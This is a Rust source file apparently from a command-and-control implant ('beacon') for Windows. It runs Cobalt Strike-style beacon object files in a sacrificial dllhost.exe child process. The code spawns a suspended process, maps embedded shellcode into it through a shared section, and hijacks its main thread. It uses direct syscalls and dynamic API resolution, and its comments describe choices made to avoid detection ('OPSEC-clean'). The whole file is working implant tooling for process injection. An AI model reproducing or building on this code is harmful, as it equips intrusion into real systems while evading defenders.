//! B3 isolated-BOF path: run a CS BOF in a sacrificial child process instead
//! of inline in the beacon (spec §4-B3, operator-selected via
//! `Command::Bof.isolate`).
//!
//! Flow (each step reuses an existing implant primitive):
//! 1. Pack the payload the bof-host entry parses at rcx:
//!    `[u32 blob_len][COFF blob][u32 args_len][args]` — args in CS beacon.h
//!    packing via [`crate::bof::pack_args`] (verbatim reuse).
//! 2. Spawn a suspended sacrificial child whose stdout+stderr is an
//!    anonymous pipe back to the beacon
//!    ([`crate::inject::create_sacrificial_isolated`], shell.rs template).
//! 3. Section-deliver the embedded bof-host PIC blob with the packed payload
//!    appended right after the code, into the SAME delivered section
//!    ([`crate::tp::section_deliver`], tp.rs pattern — no VirtualAllocEx/WPM).
//! 4. Hijack the child's main thread: Rip = section base (blob entry at
//!    offset 0), Rcx = section base + blob length (the appended payload), then
//!    resume ([`crate::inject::hijack_main_thread`], inject.rs pattern).
//! 5. Reclaim: bounded wait (60 s) → drain the pipe to EOF → map the exit
//!    code (0 = clean → `Response::BofOutput`; nonzero/crash/timeout →
//!    `Response::Err`). The bof-host writes BOF output to the inherited pipe
//!    via `BeaconPrintf`→`WriteFile(GetStdHandle(STD_OUTPUT_HANDLE))` and ends
//!    with `ExitProcess(status)`, so the exit code is the crash/error signal.
//!
//! Crash containment is the point of B3: a faulting BOF kills the CHILD, and
//! the beacon survives to report `Response::Err`. Only PRE-LAUNCH host-API
//! failures (spawn/pipe/section/hijack) return `Err(..)` so the caller can
//! fall back to inline execution (WARN-prefixed, §4-B3) knowing the BOF
//! never ran — after the resume, every outcome is a child result wrapped in
//! `Ok(..)` and an inline fallback would double-run the BOF.

#![cfg(target_os = "windows")]

use core::ffi::c_void;
use nyx_implant_core::heap::{String, Vec};
use nyx_implant_core::resolve::export_addr;
use nyx_protocol::Response;

/// The bof-host PIC blob (crates/bof-host): raw position-independent shellcode
/// with the entry `nyx_bof_host_entry` at blob offset 0 (rcx = packed payload
/// pointer). Built by the bof-host crate's PIC pipeline; embedded here so the
/// isolated path is self-contained in the implant binary.
const BOF_HOST_BLOB: &[u8] = include_bytes!("../../bof-host/bof-host.bin");

/// Hard bound on one isolated BOF run (spec §4-B3 default). On expiry the
/// child is TerminateProcess'd and reported as `Response::Err`.
const BOF_TIMEOUT_MS: u32 = 60_000;

/// Reclaim loop slice: wait this long between PeekNamedPipe drains. The
/// budget is spent on waiting, so a hung silent child still times out at
/// BOF_TIMEOUT_MS (drain is never blocking).
const PEEK_INTERVAL_MS: u32 = 100;

/// Grace period for a terminated child to actually die before we drain.
const KILL_SETTLE_MS: u32 = 5_000;

/// WAIT_TIMEOUT (WaitForSingleObject): the child outlived BOF_TIMEOUT_MS.
const WAIT_TIMEOUT: u32 = 0x0000_0102;

/// Cap on drained child output appended to a nonzero-exit `Response::Err` —
/// the bof-host writes loader diagnostics ("[bof-host] unresolved external …")
/// to the pipe before ExitProcess(1), and carrying them back makes an opaque
/// "exit 0x1" actionable. Bounded so a noisy dying child can't bloat the
/// response frame.
const ERR_OUTPUT_CAP: usize = 1024;

/// Hard cap on total drained child output. A clean child that writes more
/// than the pipe buffer blocks and hits the 60 s timeout instead, so this
/// should never trigger on the clean path — it is defense-in-depth so a
/// pathological child (many writers, oversized buffer) can never bloat the
/// response frame.
const DRAIN_CAP: usize = 1 << 20;

/// Sacrificial child image. Same default as `do_inject` (a GUI process: no
/// conhost window flash when stdout is a pipe, OPSEC-clean).
///
/// **dllhost.exe, NOT notepad.exe**: on Windows 11 24H2+ the system32
/// notepad.exe is an AppX activation stub — CreateProcessW starts the
/// Microsoft.WindowsNotepad package, whose activation re-initializes the
/// process after resume and silently discards the hijacked thread context
/// (the child then boots the real GUI app, which hangs headless and dies to
/// the 60 s timeout — empirically exit 0b0101 on windows-latest). dllhost.exe
/// (COM+ surrogate) is a plain non-AppX GUI-subsystem image present on every
/// Windows version, has no singleton semantics, and never touches the
/// desktop when hijacked.
const SPAWN_TO: &str = "dllhost.exe";

// ---- Win32 fn-pointer types (PEB-walked per call, crate convention) ----

type ReadFileFn =
    unsafe extern "system" fn(*mut c_void, *mut u8, u32, *mut u32, *mut c_void) -> i32;
type WaitForSingleObjectFn = unsafe extern "system" fn(*mut c_void, u32) -> u32;
type GetExitCodeProcessFn = unsafe extern "system" fn(*mut c_void, *mut u32) -> i32;
type TerminateProcessFn = unsafe extern "system" fn(*mut c_void, u32) -> i32;
type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
type PeekNamedPipeFn =
    unsafe extern "system" fn(*mut c_void, *mut u8, u32, *mut u32, *mut u32, *mut u32) -> i32;

/// The reclaim-phase kernel32 exports, resolved once (shell.rs ShellExports
/// precedent). The pipe read handle itself is owned by [`PipeRead`], not
/// closed here.
struct ReclaimApi {
    read_file: ReadFileFn,
    peek_named_pipe: PeekNamedPipeFn,
    wait_for_single: WaitForSingleObjectFn,
    get_exit_code: GetExitCodeProcessFn,
    terminate: TerminateProcessFn,
}

/// RAII owner of the parent's pipe read handle (SacrificialProcess/SectionGuard
/// precedent): closes it on EVERY exit path — including the pre-launch `Err`
/// returns after a successful spawn — so a failed isolated run can't leak one
/// handle per beacon cycle. Best-effort like the other guards: if CloseHandle
/// can't be resolved there is nothing to do.
struct PipeRead(*mut c_void);

impl Drop for PipeRead {
    fn drop(&mut self) {
        // SAFETY: single-threaded beacon context; best-effort cleanup. The
        // crate builds with panic=abort, so Drop never runs during unwinding.
        unsafe {
            if !self.0.is_null() {
                if let Some(addr) = export_addr(b"kernel32.dll", b"CloseHandle") {
                    let close: CloseHandleFn = core::mem::transmute(addr);
                    let _ = close(self.0);
                }
            }
        }
        self.0 = core::ptr::null_mut();
    }
}

/// Run `blob` (a CS x86_64 COFF BOF) in a sacrificial child process with
/// `args` (packed CS beacon.h style), capturing the child's stdout pipe.
///
/// Contract (spec §4-B3; beacon dispatch + `nyx_selftest_bof_isolated` rely
/// on it):
/// - clean child exit (code 0) → `Ok(Response::BofOutput(stdout bytes))`;
/// - child crash / nonzero exit / 60 s timeout → `Ok(Response::Err(..))` —
///   the beacon itself is never at risk;
/// - `Err(&'static str)` ONLY for pre-launch host-API failures (spawn, pipe,
///   section delivery, context hijack): the BOF never ran, so the caller may
///   safely fall back to inline execution.
///
/// # Safety
/// Spawns a sacrificial process, maps a section into it, and hijacks its main
/// thread (cross-process handle/memory/context ops). Single-threaded beacon
/// context.
pub unsafe fn bof_isolated(blob: &[u8], args: &[String]) -> Result<Response, &'static str> {
    // Spawn FIRST: the payload needs the child's inherited stdout handle
    // value (bof-host has no kernel32 to call GetStdHandle).
    let (mut proc, pipe_read, pipe_write_val) =
        unsafe { crate::inject::create_sacrificial_isolated(SPAWN_TO) }?;
    let payload = pack_payload(blob, args, pipe_write_val);
    let mut image = Vec::with_capacity(BOF_HOST_BLOB.len() + payload.len());
    image.extend_from_slice(BOF_HOST_BLOB);
    image.extend_from_slice(&payload);
    let pipe = PipeRead(pipe_read);
    // Loader-readiness gate: a suspended child hijacked BEFORE the loader
    // runs never maps kernel32 (proven: reading the parent's kernel32 base
    // in the child returns STATUS_PARTIAL_COPY after a direct hijack), so
    // bof-host's resolution — PEB walk or fallback — finds nothing. The
    // loader only initializes on the main thread AFTER resume: resume, poll
    // until kernel32 is mapped (readable at the parent's base — same-boot
    // ASLR), re-suspend, then hijack.
    unsafe {
        nyx_implant_core::syscalls::init_global();
        if let Some(rt) = nyx_implant_core::syscalls::global() {
            let k32 = nyx_implant_core::resolve::module_base_by_name(b"kernel32.dll")
                .unwrap_or(core::ptr::null_mut()) as usize;
            if let Err(e) = unsafe { loader_wait_kernel32(rt, &mut proc, k32) } {
                return Err(e);
            }
        } else {
            return Err("bof isolate: syscall runtime unavailable");
        }
    }
    unsafe { run_in_child(&mut proc, &image, pipe.0) }
    // `proc` drops here: handles closed (fire-and-forget once resumed; the
    // never-resumed case — a pre-launch Err above — terminates the suspended
    // child via the SacrificialProcess Drop-guard). `pipe` drops here too:
    // the read handle is closed on every path, success or Err.
}

/// Resume the suspended child, poll until kernel32 is mapped (loader has
/// run), then re-suspend for the context hijack. Without this the hijacked
/// child never maps kernel32 and bof-host can resolve nothing.
unsafe fn loader_wait_kernel32(
    rt: &nyx_implant_core::syscalls::Runtime,
    proc: &mut crate::inject::SacrificialProcess,
    k32_base: usize,
) -> Result<(), &'static str> {
    use nyx_implant_core::syscalls as sc;
    let mut prev: u32 = 0;
    let st = unsafe { sc::nt_resume_thread(rt, proc.main_thread as usize, &mut prev) };
    if st.is_none() || st.unwrap() < 0 {
        return Err("bof isolate: loader resume failed");
    }
    let mut ready = false;
    for _ in 0..1500 {
        let mut probe: u32 = 0;
        let st = unsafe {
            sc::nt_read_virtual_memory(
                rt,
                proc.handle as usize,
                k32_base,
                (&mut probe as *mut u32) as *mut u8,
                4,
            )
        };
        if st.is_some() && st.unwrap() >= 0 && probe != 0 {
            ready = true;
            break;
        }
        unsafe { sc::nt_delay_execution(rt, 0, 20_000) };
    }
    if !ready {
        return Err("bof isolate: kernel32 never mapped in child");
    }
    let st = unsafe { sc::nt_suspend_thread(rt, proc.main_thread as usize, &mut prev) };
    if st.is_none() || st.unwrap() < 0 {
        return Err("bof isolate: re-suspend failed");
    }
    Ok(())
}

/// Post-spawn half: deliver → hijack → reclaim. Kept separate so every
/// pre-launch failure returns `Err` BEFORE the child can run (see the
/// contract note on `bof_isolated`).
unsafe fn run_in_child(
    proc: &mut crate::inject::SacrificialProcess,
    image: &[u8],
    pipe_read: *mut c_void,
) -> Result<Response, &'static str> {
    let base = unsafe { crate::tp::section_deliver(proc.handle, image) }
        .map_err(|_| "bof isolate: section delivery failed")?;
    let entry = base as u64; // blob entry at offset 0
    let arg = (base + BOF_HOST_BLOB.len()) as u64; // payload appended after the code
    unsafe { crate::inject::hijack_main_thread(proc, entry, arg) }?;
    // The child is now running (or already exited): from here every outcome is
    // a child result — Ok(..), never a fallback-able Err.
    Ok(unsafe { reclaim(proc.handle, pipe_read) })
}

/// Pack the payload the bof-host entry parses at rcx:
/// `[u32 blob_len][COFF blob][u32 args_len][args]` (crates/bof-host lib.rs
/// layout). `args` uses the exact CS beacon.h packing of the inline loader
/// ([`crate::bof::pack_args`] — verbatim reuse).
fn pack_payload(blob: &[u8], args: &[String], pipe_write_val: usize) -> Vec<u8> {
    let packed_args = crate::bof::pack_args(args);
    // The parent's ntdll base + the child's inherited stdout handle value,
    // appended after the args: the sacrificial child never maps kernel32
    // (loader is hijacked before LdrpInitializeProcess), so bof-host
    // resolves everything from ntdll (same-boot ASLR: bases are shared) and
    // writes output with NtWriteFile on the inherited handle (see bof-host
    // lib.rs export_addr / shim.rs out_write).
    let nt = unsafe { nyx_implant_core::resolve::module_base_by_name(b"ntdll.dll") }
        .unwrap_or(core::ptr::null_mut()) as u64;
    let mut out = Vec::with_capacity(8 + blob.len() + packed_args.len() + 24);
    out.extend_from_slice(&(blob.len() as u32).to_le_bytes());
    out.extend_from_slice(blob);
    out.extend_from_slice(&(packed_args.len() as u32).to_le_bytes());
    out.extend_from_slice(&packed_args);
    out.extend_from_slice(&0u64.to_le_bytes()); // stage slot (bof-host progress; read by diagnostics)
    out.extend_from_slice(&nt.to_le_bytes());
    out.extend_from_slice(&(pipe_write_val as u64).to_le_bytes());
    out
}

/// Resolve the reclaim-phase kernel32 exports. `None` if any is missing.
unsafe fn reclaim_resolve() -> Option<ReclaimApi> {
    Some(ReclaimApi {
        read_file: core::mem::transmute(export_addr(b"kernel32.dll", b"ReadFile")?),
        peek_named_pipe: core::mem::transmute(export_addr(b"kernel32.dll", b"PeekNamedPipe")?),
        wait_for_single: core::mem::transmute(export_addr(
            b"kernel32.dll",
            b"WaitForSingleObject",
        )?),
        get_exit_code: core::mem::transmute(export_addr(b"kernel32.dll", b"GetExitCodeProcess")?),
        terminate: core::mem::transmute(export_addr(b"kernel32.dll", b"TerminateProcess")?),
    })
}

/// Reclaim the resumed child: interleaved bounded wait + drain, then map the
/// outcome. Every `PEEK_INTERVAL_MS` slice we (1) drain whatever is already
/// readable via PeekNamedPipe — never blocking — so a BOF that writes MORE
/// than the pipe buffer (default 4096, kernel limit ~64 KiB) keeps making
/// progress instead of blocking on WriteFile and dying to the timeout, and
/// (2) wait for the child. The 60 s budget is spent on WAITING, not on
/// reading, so a BOF that hangs without writing still times out (drain-first
/// would block forever and defeat B3's containment). The pipe read handle is
/// closed by the caller's [`PipeRead`] guard on every path. Post-launch, so
/// every result is `Response`-level (never the `Err` fallback channel).
unsafe fn reclaim(proc_h: *mut c_void, pipe_read: *mut c_void) -> Response {
    let api = match unsafe { reclaim_resolve() } {
        Some(a) => a,
        None => {
            // Can't even wait: best-effort kill so a runaway child isn't left
            // behind, then report as a child error (an inline fallback now
            // would double-run the BOF).
            if let Some(addr) = export_addr(b"kernel32.dll", b"TerminateProcess") {
                let term: TerminateProcessFn = core::mem::transmute(addr);
                let _ = unsafe { term(proc_h, 1) };
            }
            return Response::Err(String::from("bof isolate: reclaim api unresolved"));
        }
    };
    let mut waited_ms: u32 = 0;
    let mut out: Vec<u8> = Vec::new();
    loop {
        // 1. Drain what is already readable (never blocks: PeekNamedPipe
        //    reported it available). Keeps an output-heavy BOF from stalling
        //    on a full pipe buffer. Bytes land in `out` (bounded by
        //    DRAIN_CAP; beyond the cap we keep draining and dropping so the
        //    child never blocks on a reader that stopped).
        unsafe { drain_available(&api, pipe_read, &mut out) };
        // 2. Wait one slice. WAIT_OBJECT_0 (0) = child exited.
        match unsafe { (api.wait_for_single)(proc_h, PEEK_INTERVAL_MS) } {
            0 => return unsafe { reclaim_exited(&api, proc_h, pipe_read, out) },
            WAIT_TIMEOUT => {}
            _ => return unsafe { reclaim_wait_failed(&api, proc_h) },
        }
        waited_ms += PEEK_INTERVAL_MS;
        if waited_ms >= BOF_TIMEOUT_MS {
            return unsafe { reclaim_timeout(&api, proc_h, pipe_read, out) };
        }
    }
}

/// Read everything PeekNamedPipe currently reports as available, appending
/// to `out` up to [`DRAIN_CAP`]; beyond the cap the pipe is still drained
/// (bytes dropped) so a verbose child never blocks on a stopped reader.
/// Never blocks: the peeked byte count is a guarantee that the read returns
/// immediately.
unsafe fn drain_available(api: &ReclaimApi, pipe_read: *mut c_void, out: &mut Vec<u8>) {
    let mut total: u32 = 0;
    let ok = unsafe {
        (api.peek_named_pipe)(
            pipe_read,
            core::ptr::null_mut(),
            0,
            core::ptr::null_mut(),
            &mut total,
            core::ptr::null_mut(),
        )
    };
    if ok == 0 || total == 0 {
        return;
    }
    let mut buf = [0u8; 4096];
    let mut left = total as usize;
    while left > 0 {
        let want = left.min(buf.len());
        let mut read: u32 = 0;
        let ok = unsafe {
            (api.read_file)(
                pipe_read,
                buf.as_mut_ptr(),
                want as u32,
                &mut read,
                core::ptr::null_mut(),
            )
        };
        if read == 0 {
            break;
        }
        let got = (read as usize).min(left);
        left -= got;
        if out.len() < DRAIN_CAP {
            let room = DRAIN_CAP.saturating_sub(out.len());
            out.extend_from_slice(&buf[..got.min(room)]);
        }
        if ok == 0 {
            break;
        }
    }
}

/// Timeout path: kill the hung child, let the kill land, drain whatever it
/// wrote, and report the pinned timeout error with whatever output was
/// already captured (bounded). The drain is gated on the settle-wait
/// confirming the kill — a still-alive silent child would block ReadFile
/// forever and hang the beacon (B3's containment must never lose to a
/// reclaim-path block; losing the partial output is the smaller evil).
unsafe fn reclaim_timeout(
    api: &ReclaimApi,
    proc_h: *mut c_void,
    pipe_read: *mut c_void,
    mut out: Vec<u8>,
) -> Response {
    unsafe {
        let _ = (api.terminate)(proc_h, 1);
        // The kill lands: whatever the child wrote before stalling (stage
        // markers etc.) is now readable — keep it for the diagnostics.
        if (api.wait_for_single)(proc_h, KILL_SETTLE_MS) == 0 {
            let tail = drain(api.read_file, pipe_read);
            if out.len() < DRAIN_CAP {
                let room = DRAIN_CAP.saturating_sub(out.len());
                out.extend_from_slice(&tail[..tail.len().min(room)]);
            }
        }
    }
    let mut msg = String::from("bof isolate timeout");
    append_captured(&mut msg, &out);
    Response::Err(msg)
}

/// WAIT_FAILED/abandoned path: the wait itself can't be trusted — kill the
/// child rather than risk a zombie and report a child error.
unsafe fn reclaim_wait_failed(api: &ReclaimApi, proc_h: *mut c_void) -> Response {
    unsafe {
        let _ = (api.terminate)(proc_h, 1);
    }
    Response::Err(String::from("bof isolate: wait failed"))
}

/// Clean-wait path: harvest the exit code, drain the pipe to EOF (the exited
/// child holds no writer, so this returns promptly), then map: 0 → BofOutput;
/// nonzero (crash status or the bof-host's loader-error ExitProcess(1)) →
/// Err, with the drained diagnostics appended (bounded) so "unresolved
/// external" style failures stay actionable.
unsafe fn reclaim_exited(
    api: &ReclaimApi,
    proc_h: *mut c_void,
    pipe_read: *mut c_void,
    mut out: Vec<u8>,
) -> Response {
    let mut exit_code: u32 = 0;
    unsafe {
        let _ = (api.get_exit_code)(proc_h, &mut exit_code);
    }
    // Final drain: whatever the child wrote in its last moments after the
    // final peek (it holds no writer now, so this returns promptly).
    let tail = unsafe { drain(api.read_file, pipe_read) };
    if out.len() < DRAIN_CAP {
        let room = DRAIN_CAP.saturating_sub(out.len());
        out.extend_from_slice(&tail[..tail.len().min(room)]);
    }
    if exit_code == 0 {
        return Response::BofOutput(out);
    }
    let mut msg = String::from("bof isolate: child exit 0x");
    push_hex_u32(&mut msg, exit_code);
    append_captured(&mut msg, &out);
    Response::Err(msg)
}

/// Append up to [`ERR_OUTPUT_CAP`] captured bytes to an error message as a
/// " — child output: …" suffix (utf8-lossy; matches reclaim_exited's format).
fn append_captured(msg: &mut String, out: &[u8]) {
    if out.is_empty() {
        return;
    }
    msg.push_str(" — child output: ");
    let take = out.len().min(ERR_OUTPUT_CAP);
    msg.push_str(&String::from_utf8_lossy(&out[..take]));
}

/// Read the pipe to EOF. Every caller reaches this only after the child has
/// exited or been killed, so no writer remains and ReadFile returns promptly
/// with whatever the child wrote before dying. Appends never exceed what was
/// actually read (shell.rs defense-in-depth pattern).
unsafe fn drain(read_file: ReadFileFn, pipe_read: *mut c_void) -> Vec<u8> {
    let mut out: Vec<u8> = Vec::new();
    let mut buf = [0u8; 4096];
    loop {
        let mut read: u32 = 0;
        let ok = unsafe {
            read_file(
                pipe_read,
                buf.as_mut_ptr(),
                buf.len() as u32,
                &mut read,
                core::ptr::null_mut(),
            )
        };
        if read == 0 {
            break; // EOF or error: done.
        }
        let take = (read as usize).min(buf.len());
        if out.len() + take > DRAIN_CAP {
            let room = DRAIN_CAP.saturating_sub(out.len());
            out.extend_from_slice(&buf[..room]);
            break; // cap hit: keep what we have, stop reading.
        }
        out.extend_from_slice(&buf[..take]);
        if ok == 0 {
            break; // ReadFile errored after yielding bytes — keep what we got.
        }
    }
    out
}

/// Append `v` as 8 lowercase hex chars (selftests.rs push_hex_u64 pattern).
fn push_hex_u32(s: &mut String, v: u32) {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    for i in (0..8).rev() {
        s.push(HEX[((v >> (i * 4)) & 0xf) as usize] as char);
    }
}
